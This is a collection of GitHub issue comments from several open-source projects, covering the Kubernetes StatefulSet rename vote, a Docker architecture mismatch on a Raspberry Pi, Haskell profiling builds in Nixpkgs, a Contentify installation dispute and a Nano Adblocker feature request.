kubernetes/kubernetes/27430/256128192,27430,"I know people probably don’t want even more choices at this point but, after reading again recent arguments and looking at the options in that poll, I wonder why I haven’t seen OrderSet - os OrderedSet - os OrderedInstanceSet - os IndexSet - is IndexedSet - is IndexedInstanceSet - is SequenceSet - seq SequencedSet - seq SequencedInstanceSet - seq OrdinalSet - os Key point Noun (not Adjective) It’s important that the name reflects what the abstraction actually represents and establishes expectations. Just stirring things on an otherwise boring Saturday ) ",,False
kubernetes/kubernetes/27430/256128722,27430,PersistentPodSet? ,,False
kubernetes/kubernetes/27430/256190365,27430,"My own analysis of the 77 votes cast so far shows that  is the runaway winner, by the Condorcet winner criterion. The pairwise comparisons ( vs. X) were plus one5 v. PersistentSet plus one9 v. IdentitySet +27 v. NominalSet +35 v. PersistentInstanceSet +37 v. IdentityArray +39 v. NominalArray +43 v. PersistentArray +43 v. PersistentInstanceArray +45 v. RoleArray +47 v. RoleSet +47 v. StatefulArray +53 v. StatefulApp +65 v. Stateful In any event, #35534 is already open to track renaming to . ",,False
kubernetes/kubernetes/27430/256191731,27430,"I finished crunching the numbers and the winner is StatefulSet. It won via multiple methods - average position (polljunkie) and condorcet using completion rules Schulze/Beatpath/CSSD, CIVS Ranked Pairs, MAM, Condorcet-IRV. There is sometimes a bit of variation on the ordering after the top but the top is always StatefulSet. The new name for PetSets will be StatefulSet. I am truly sorry that some folks were displeased with the processes, transparency, and choices.  Hopefully we can do a much better job next time should such a need arise. ",,False
kubernetes/kubernetes/27430/256210785,27430,"I'll take the todo to formalize some of the name decision processes and get that adapted to api_change.md.  We have a set of guidelines for names (some of which we helped describe here) and that will help make the future process for name changes smoother. Marking as resolved - thanks everyone for keeping this civil, even if there were some bumps. ",,False
kubernetes/kubernetes/27430/256279151,27430,"@friend would be great if you consider the old name in the next poll. I don't really care about names, but if you break backwards compatibility, because of renaming then I care. ",,False
kubernetes/kubernetes/27430/256281997,27430,@friend having a defined process about re-naming I think is worthwhile. Think it would have helped with some of the bumps.  Appreciate u taking that on ,,False
kubernetes/kubernetes/27430/256390501,27430,"I'll take the todo to formalize some of the name decision processes and get that adapted to api_change.md.  We have a set of guidelines for names (some of which we helped describe here) and that will help make the future process for name changes smoother. On Tue, Oct 25, 2016 at 608 PM, Dan Paik notifications@friend.com wrote ",,False
kubernetes/kubernetes/27430/256394474,27430,"@friend if you can have a PR / issue open for comment about doing so, that'd be swell (and link it in this issue) ",,False
kubernetes/kubernetes/27430/256725020,27430,Renaming to StatefulSet ,,False
kubernetes/kubernetes/27430/256726964,27430,"There is the question of how we decide the name.  I don't think voting turned out to be a good way to do that. There is also the question of how rename impacts users.  We will see how the ""delete alpha resource"" impacts users when they upgrade their clusters to 1.5 and StatefulSet.   We may decide that pattern is too costly.  If so, we should invest in the API machinery to allow us to concurrently host the old Kind and the new Kind (in cases when the representations are intraconvertible). @friend we talked about this topic recently. ",,False
kubernetes/kubernetes/27430/256727188,27430,"@friend your proposal will cover both those topics? (and more, I suspect, knowing you 😄 ) ",,False
kubernetes/kubernetes/27430/256787178,27430,"Yeah I plan to early next week. On Thu, Oct 27, 2016 at 218 PM, Eric Tune notifications@friend.com wrote ",,False
moby/moby/35447/272477450,35447," /kind bug /kind error /sig docker /sig openwrt What happened I can't run this command in Raspberry Pi3 Raspbian docker. docker import  openwrt-x86-generic-rootfs docker images REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE openwrt-x86-generic-rootfs   latest              9015fa51eb3f        48 seconds ago      5.28MB &lt;none&gt;                       &lt;none&gt;              e4205a844e2b        19 minutes ago      5.28MB docker run -i -t openwrt-x86-generic-rootfs /bin/ash standard_init_linux.go195 exec user process caused ""exec format error"" ♠ I just want to Open WRT environment by Raspberry Pi3 on Raspbian with Docker.. What should I do? Anything else we need to know? Environment  Docker version (use ) Client Version      17.10.0-ce API version  1.33 Go version   go1.8.3 Git commit   f4ffd25 Built        Tue Oct 17 191344 2017 OS/Arch      linux/arm  Server  Version      17.10.0-ce  API version  1.33 (minimum version 1.12)  Go version   go1.8.3  Git commit   f4ffd25  Built        Tue Oct 17 190618 2017  OS/Arch      linux/arm  Experimental false  Cloud provider or hardware configuration Raspberry Pi3 on Raspbian  OS (use ) Linux raspberrypi 4.9.59-v7+ #1047 SMP Sun Oct 29 121923 GMT 2017 armv7l GNU/Linux  Kernel (e.g. ) Linux master 4.10.0-37-generic #41~16.04.1-Ubuntu SMP Fri Oct 6 224259 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux  Install tools Docker-CE v17.10  Others  ※ P.S  Could you recommend the way that how to set up Open WRT environment using docker images? ",,False
moby/moby/35447/343142950,35447,(you can't run x86 binaries on ARM) ,,False
moby/moby/35447/343143586,35447,"Yes, looks like you're trying to run binaries for a different architecture, which won't work. Let me close this issue, because this is not a bug, but feel free to continue the conversation. ",,False
moby/moby/35447/343338546,35447,Could you recommend the Open WRT Image on my docker environment? ,,False
moby/moby/35447/343339738,35447,no idea; sounds like a better question for the Open WRT community; this showed up when Googling; ,,False
nixpkgs/NixOS/22340/204548550,22340,"Serious Haskell hackers need to profile their code, and that requires special variants of the libraries involved in the build. By default, we don't build those libraries. Should we? If we do, then I see the following options  Provide separate package sets (e.g.  and ) and selectively enable both variants on hydra.nixos.org for appropriate compiler versions, i.e. for the default compiler that's used to build , too. This means that users get the non-profiled package set by default, but they can switch to the profiled package set if they wish to do so. Pros  Users who wish to use profiling can do so. Users who don't profile see no difference, i.e. they don't have to download larger packages or deal with increased closure sizes, etc. Cons  We let  compile every library 5 times (static, dynamic in non-profiling package set, static, dynamic without profiling plus static with profiling in the profiling package set). This is going to slow down our builds, no doubt, and it's also doing to slow down other, non-Haskell builds. The amount of data our binary cache has to store increases by a factor of 2.5, approximately, because we upload the profiled packages in addition to the non-profiled ones. Hard-linking the identical files in both variants won't work because  doesn't produce deterministic binaries across re-builds of the same code.     We can enable profiling by default in our main package set, . Pros  Users who want to profile their code can do so without any manual effort at all -- everything just works. Cons  Hydra has to compile an additional variant of every library, which will increase the build time by a factor of 1.5, approximately.  The disk space and bandwidth requirements on  increase by a factor of ~1.5, too. We increase the build-time and runtime closure size of every dynamically linked Haskell derivation (that is almost all of them) by a factor of ~1.5 for all users, not just for those who care about profiling. That issue could be mitigated by placing profiling libraries into their own derivation output, but it's not clear whether this can be accomplished easily and the corresponding ticket,  has made no progress in the last 2.25 years, so it's not obvious why a working implementation of that feature should pop up out of the blue right now.      Opinions? ",,False
nixpkgs/NixOS/22340/276634155,22340,"This isn't really a community discussion, is it? Whoever is paying for Hydra can decide this unilaterally. Technically, it would probably be possible to modify GHC such that it would output both profiling and non-profiling in once pass, if anyone wanted to do any engineering on it, that is. ",,False
nixpkgs/NixOS/22340/276653396,22340,I'm in two minds about this At LumiGuide we use option 1. We care about small closure sizes since some of our machines are connected to the internet through mobile links with limited bandwidth. Although option 2 would be simpler and thus more user friendly which IMHO weighs more heavily than our specific requirements. So for me it's a +0.1 for option 2 and I hope  will make progress. ,,False
nixpkgs/NixOS/22340/276751475,22340,"I believe that this is more a question of what the user wants, or rather what we want the user experience to be like. Whether Hydra will cope with the load or not is a subject of speculation. Nobody really knows and we're probably not going to get a definite answer to that question. IMHO, we should chose whatever the best solution is and then try it. ",,False
nixpkgs/NixOS/22340/277270900,22340,"At Takt we use a mixture of options 1 and 2. For all non-Takt code we use option 2, but then for our own code we use option 1 (in fact we go even further We have a package set enabling optimizations for our packages, and another package set disabling them). This has worked quite well for us, because we only have to compile our dependencies once and they will satisfy the needs of any option 1  alternative we might want to use for our own code. With this in mind, I lean towards option 2, as I think it leads to a more rewarding stock experience for users. Those needing smaller closure sizes can tune these things a bit. By the way, besides setting  and  to , we are adding this to our  ",,False
nixpkgs/NixOS/22340/277757117,22340,"If we go with 2 plus multiple outputs, we can still get small closures ",,False
nixpkgs/NixOS/22340/277758244,22340,"Your own packages , or over the entire package set? If it's the latter, I really wouldn't want that in ! Almost everything on Hackage should have no profiling information added unless a flag is turned on. The fact that some packages unilaterally export  is a bug of those packages - it just poisons profiling information. But if it's just your own stuff, then of course that makes sense (though I'd still suggest using  in your cabal files, and protecting it with a flag). ",,False
nixpkgs/NixOS/22340/277759588,22340,"@friend I agree with your thoughts. This works well for our use case (although fortunately we don't need to do profiling very often!), but for  we probably don't want these as default. ",,False
nixpkgs/NixOS/22340/277764314,22340,"seems to be useful for stack-traces, though, which maybe is something worth having by default ",,False
nixpkgs/NixOS/22340/277768746,22340,"Still a ""please no"" to that. That's a ton of information in  output, most of which will be outside my control anyway. ",,False
nixpkgs/NixOS/22340/277771376,22340,"Hmm... maybe this highlights a problem, then Seeing as ""enabling profile information"" can mean different things depending on the flags passed to the compiler, does it make sense to provide a profiled Haskell package set at all if it won't satisfy the profiling needs of most people? ",,False
nixpkgs/NixOS/22340/277779126,22340,"The only reason I want a profiling set is so I can compile my code with profiling. Ultimately, any called library code will show up in my own profiling by making my own calls themselves slow. I profile with the attitude of ""vendor code is efficient, my code is inefficient"". Only after ruling out my own code as being problematic do I want to start seeing the gory internals of other code. And even then I gradually opt in and work my way ""down the stack"", so to speak. On Mon, 6 Feb 2017, 634 pm Renzo Carbonara, notifications@friend.com wrote ",,False
nixpkgs/NixOS/22340/278677010,22340,@friend I can agree with that reasoning 👍 ,,False
nixpkgs/NixOS/22340/283048389,22340,"It's hard to decide which one solution is best. After some thought, I lean towards enabling profiling library builds by default in the upcoming  release branch (but not in ). The rationale for that choice is that I assume ""end-user types"", who benefit the most from this change, to be most likely using the release branch rather than following git . People who follow git , on the other hand, I assume to be able to accomplish whatever they need by means of overriding the default configuration. Having profiling enabled by default gives more convenience to normal users, but it's a disadvantage for power users who want to create their own. minimal installations for production. Again, here I assume that those people know how to override the configuration in order to do exactly what they need. I'm sure this is not the best solution, but I can't think of any better one. ",,False
nixpkgs/NixOS/22340/283088643,22340,"Eh, I'm -1 on release branches behaving differently that way. The ""normal user"" ""git master user"" distinction is not one we want to make bigger! ",,False
nixpkgs/NixOS/22340/289416619,22340,"OK, I suppose I won't enable profiling builds on  at all since there is no obvious solution how to do it in a way that's sufficiently beneficial for our users to warrant the costs such a change would incur. I'll leave the ticket open for now, nut I'll remove the  label. ",,False
nixpkgs/NixOS/22340/291853486,22340,"I think option 2 is really the way to go for now. The main drawback is really going to be the increased closure size. @friend highlights a concern here due to the link to deployment machines being a bottleneck, but I wonder - do you compile into a static binary? At CircuitHub we have found the smallest closure is to build a statically linked executable and then strip it. In this case, I'm not sure the inflation of profiling libraries would make a difference, and they would become a development-only cost. ",,False
nixpkgs/NixOS/22340/291857386,22340,@friend at LumiGuide I recently wrapped all our Haskell executables in  and I was very happy with the results. For our image analysis server  closure size went from 2490.53 MiB to 1668.72 MiB. output size went from 26.70 MiB to 22.87 MiB.  So I don't have a problem anymore with option 2. ,,False
nixpkgs/NixOS/22340/359306218,22340,"If the profiling versions of libs can't be supplied by , I think I've reached a reasonable approach for achieving it manually. ",,False
nixpkgs/NixOS/22340/359308424,22340,@friend does the recent multiple outputs stuff change things here? ,,False
nixpkgs/NixOS/22340/373906344,22340,This will make a huge difference. Thanks for sorting this Peti! ,,False
nixpkgs/NixOS/22340/373924554,22340,It's very good that we now have profiled libraries available from the cache. No need to build our own profiled libraries anymore. Thanks peti! ,,False
nixpkgs/NixOS/22340/373927708,22340,Oh interesting. ,,False
Doomsday-Trail/AnthonyMarc23/1/335396060,1,@friend check it out ,,False
FastHub/k0shk0sh/2181/394037322,2181,"Proposes several changes to increase ease of reading strings. The general message conveyed has not been changed, but there have been some adjustments  Typos fixed Punctuation added where currently missing Consistency in terms of American/British language (specifically the word ""organizations"") A couple of changes to words which sound better  (cc @friend) ",,False
GameController/RoboCup-Humanoid-TC/17/223780657,17,Adding the Rhoban Football Club logo (HL KID team 16) ,,False
GameController/RoboCup-Humanoid-TC/17/297620954,17,Looks good to me ) ,,False
FrameworkBenchmarks/TechEmpower/1024/40441145,1024,"I removed the dirs in #883, but the dirs were accidentally re-added in when merging PR #1015. ",,False
FrameworkBenchmarks/TechEmpower/1024/52435722,1024,"Ah, my bad. Thanks for cleaning it up ",,False
Flexbones/roikles/61/186262270,61,Came across a situation where it was necessary to add a column to the wordpress post list in the backend to show taxonomies per post and it couldn't be simpler to implement just add the following to the Taxonomy arguments in lib/taxonomies.php ,,False
Flexbones/roikles/61/265723164,61,Fixed in 846dcdc ,,False
Contentify/Contentify/398/338891837,398,"So I installed this for a friend, and already at the installation I noticed that much stuff doesn't work. The current release version has errors with the apache_get_modules function, which is disabled due to security reasons, the script wants access to the php main directory, which a php script NEVER should have access to. And after I gave him all this, I just get that  What the hell. ",,False
Contentify/Contentify/398/402999274,398,Ok I found the mistake. Ever heard of case sensitive? Apperently not ,,False
Contentify/Contentify/398/403026140,398,"Hello Contentify is an open source software without any funding or commercial background (currently at least). Creating and maintaining an entire CMS usually keeps whole companies busy over years, costing up to millions of dollars / euros. Lacking these means you have to try to find smart cutoffs. This is why Contentify has zero tests (automatic tests via PHPUnit etc.) and this is why there is no huge testing phase before a new version of Contentify is released. Sometimes this causes error. You faced one of these, because Contentify is developed on Windows, not on Linux. Windows is case insensitive regarding file names. ",,False
Contentify/Contentify/398/403027119,398,Closing this one. Please stick to constructional criticism if you want to get help. ,,False
Contentify/Contentify/398/403028973,398,"The fact that you say ""Developt on Windows"" shows me that you have no idea. Case Sensivity is something that everyone should follow, and I am sorry that you don't see that. Here your critic First apache_get_modules is a security issue and by default on most webservers disabled Second Your installer ignores the entry at the MySQL data and tries as root anyways, you have to reload the page and try again for it to work, I would guess thats because you first try to connect before reading and saving the mysql data. Third Case sensivity is something that exists since years, and it became a standard under developers to always keep case sensivity in mind. and last but not least If it was developt on windows and does not work on Linux by nature, you should write that in the requirements. ",,False
Contentify/Contentify/398/403030035,398,And also thank you for being in the EU and not following the laws. Read it up kiddo DSGVO ,,False
Contentify/Contentify/398/403033160,398,Oh also btw WoltLab and WordPress are also Open Source and they have way more features. ,,False
Contentify/Contentify/398/403033631,398,"Another afront, and again you do not care about the reasons. Ofcourse every developer who creates software that typically runs on a Linux OS has to know about the important differences between the target OS and the development OS. Thus however does not guarantee no typos etc are made. Take a look at your own quote, you quoted me wrong (""Developt""). Nothing else happened @ Contentify. A stupid mistake, yes. But if you do not take the circumstances into account you should be very careful with attacking others. And again, you blame others for not creating a perfect software for free. ",,False
Contentify/Contentify/398/403034224,398,"No I blame you that since more then 24 hours I have nothing but problems with this. And that just because you didn't wrote a capital C , but instead a lowercase one ",,False
Contentify/Contentify/398/403034409,398,"But whatever, I will fork it, exchange it and do a pull request. Is that enough Constructive critic for you? ",,False
Contentify/Contentify/398/403037205,398,"Good. Whetever. I don't care. I am not a user of this, a friend asked me to setup it for him and I said yes and since 24 hours I just have problems. I fixed it now, you know about the Case Sensivity error, I don't care about anything else. ",,False
Contentify/Contentify/398/403079902,398,"Thank you, for reporting the issues and giving explanations why they are issues. Believe it or not, I understand why you are upset. I work as a professional software developer and I’d be very upset if a software that I have bought does not work. But that is the point, this is not the case here. The only “payment” is... if some say “thank you”, I guess. Getting negative feedback is okay but it is frustrating as well if it feels like an attack against the persons that spend their free time on creating something without making any money with it. ",,False
Contentify/Contentify/398/403125138,398,"Sorry for being a bit harsh. It was just that the tone of your second and third post was quite unfriendly. Honestly, Contentify cannot reach the same high quality level as for example WordPress. WP has a huge community and lots of contributors plus a strong commercial background. None of these is true for Contentify. Therefore, it has no ads ad all, nowhere at all (except of some recommendations which do not generate any money). It does not spy on you or restrict you. DSVGO / GDPR...  If this really is something that interests you, let me ensure you, the only thing you have to worry about is the use of Google Analytics on the contentify.org website. That's the only ""evil"" third party software that is in use. And on our side, we do collect very (extremely?) few client data and we do very (rarely / almost none) analysis of the collected data. And ofcourse we do not sell / share any user data (not including Google Analytics). ",,False
Contentify/Contentify/398/409973397,398,@friend Do not listen to him this CMS is great and thanks for creating! ,,False
Contentify/Contentify/398/482079135,398,Update Contentify.org is officially GDPR compliant. ,,False
NanoCore/NanoAdblocker/87/287260640,87,i think this is the best enhancement ,,False
NanoCore/NanoAdblocker/87/356443671,87,I don't see a reasonable implementation of this... ,,False
NanoCore/NanoAdblocker/87/356444124,87,"Filter lists can limit the amount of domains each rule apply to with many ways. If you need to set a different set of filter lists for each domain, then chances are the filter lists you are using are kind of broken.  And there isn't a reasonable way to swap filter lists sets internally. ",,False
NanoCore/NanoAdblocker/87/356447669,87,"it depends on how the internal data structure of the core looks like if the rules still have a reference to the list they came from then it shouldnt be too hard to just ignore them on a specific website just like you can switch off blocking completely for a site. if the internal structure is just a huge merged and optimized set of rules, which i assume is the case, then you would have to rebuild that internal structure once you click on that button or when you later load that site again or if you leave and all filterlists should be on again. if the performance hit is too great then there are two ways to deal with it. generate an internal structure for each new combination of active lists and keep it for later or use the normal datastructure when all lists are on and if one or more are disabled then execute each least sequentially. this could behave differently than a combined list, like you mentioned, so maybe some sort of hybrid would be needed. so, yeah, not an easy task if my assumptions about the project are correct. but it would still be a very worthwhile feature that you shouldn't give up that easily. maybe gorhills rework of the engine makes this easier to implement. ",,False
NanoCore/NanoAdblocker/87/356449799,87,"Whitelist just completely disables filtering, that's different than disable one specific filter list for that domain. Currently, if I understood the code right, each filter list will be compiled separately and stored, all selected filters are merged together. The merging process need to be done every time a filter list is turned on or off. There are also snapshots of internal states for fast startup. I can't think of a single use case. Did you spelled ""harder"" wrong? ",,False
NanoCore/NanoAdblocker/87/356460317,87,"i dont think he wanted whitelisting. if you have experimental or generic filterlists that work well most of the time but occasionally break sites then you want to quickly disable the list for this specific website but not in general and you do not want to go through the dashboard every single time you visit that site again. you should also contact the maintainer but it will take time until it is fixed. you could even just move along and after a few weeks you look up your dynamic rules and post a bug report with all the problems you collected over time but were too lazy to report at that moment. well, unlikely but at least possible ",,False
NanoCore/NanoAdblocker/87/356461593,87,"Just override the rule with your custom filters, that's what it's for. ",,False
NanoCore/NanoAdblocker/87/356463212,87,"while still a lot more work than 2 clicks i could do this. most people wont. blocking something with the element hider is something many would be capable but figuring out an exception rule is too much for casual users who just set it up, tweak a few options and select and install a few lists and then call it a day. not everyone is going to read the wiki about the filter syntax and then debug every page that causes problems. giving them a better option than having to switch off Nano Blocker entirely or uninstalling a list just because of one or two false positives would really add some usability benefit. ",,False
NanoCore/NanoAdblocker/87/356465040,87,"If you are a casual user, chances are you won't be adding filter lists other than those that come with Nano Adblocker.  If you are a casual user, chances are you won't be able to know which filter list you have is causing the problem.  If you can find out which filter list is causing the problem you will be able to set up the exception filter. If you absolutely need to toggle between two sets of filters, use browser profile. This is non-trivial and only has theoretical use case, I'll decline this feature for now. ",,False
NanoCore/NanoAdblocker/87/356465261,87,What I will do is to add a button in Logger that turns off a rule. ,,False
NanoCore/NanoAdblocker/87/356469661,87,mayby quick access to off specific rule on single site example.  ,,False
NanoCore/NanoAdblocker/87/356473436,87,"If you find yourself have to toggle a filter list frequently, then you probably need to figure out what exactly is wrong. ",,False
NanoCore/NanoAdblocker/87/356477516,87,you do not only want this when something is wrong. maybe you have a list that implements a night mode and you personally do not want it on a specific site or a floating header that you want for some special use case or you want to allow ads for a site but not tracking and annoyances.... besides that it is great for trouble shooting. you turn off lists as long as the site works again. then you immediately know who to send a bug report to. ,,False
NanoCore/NanoAdblocker/87/356479301,87,"If you need a night mode or any other mode, use browser profile.  For trouble shooting, use the Logger. ",,False
NanoCore/NanoAdblocker/87/356515829,87,make a browser profile for every website? thats not practical. you do not need that many tries if you always the disable half of the remaining ones. ~log2(n) turns. ,,False
NanoCore/NanoAdblocker/87/356574112,87,an ordinary user will not be able to and will not want to look into the logger. ,,False
NanoCore/NanoAdblocker/87/356580154,87,like this?  ,,False
NanoCore/NanoAdblocker/87/356602225,87,You do realize there are over 100 000 rules enabled by default right? ,,False
NanoCore/NanoAdblocker/87/356602438,87,on single site?  O ,,False
NanoCore/NanoAdblocker/87/356603054,87,There are well over 10 000 rules affecting every single site. A lot of generic rules in EasyList. ,,False
NanoCore/NanoAdblocker/87/356603912,87,hmm.. you can segregate this rules to category and hide ,,False
NanoCore/NanoAdblocker/87/356608801,87,"gorhill has his decisions, I have mine. If you disagree with both, then you have to look for another fork, or fork yourself, then you don't need to convince me to implement the feature. Maybe we have a different definition of ""casual user"", but I don't think any of the proposed feature is useful. If you need a per-site profile, then chances are you are not a casual user, and should use a custom filter list for that.  Listing active rules on the popup will definitely not be easier to use than the Logger, and casual users cannot understand what they are seeing. If Logger is too complex for them, putting a smaller Logger in the popup will just be worse. I'm not sure what that means, you are welcomed to teach me how to code, but do so in Pull Requests.  I'm locking this as it's not getting anywhere, if you truly believe this feature is necessary, please Pull Request, I can test out the result and maybe I will change my mind. ",,False
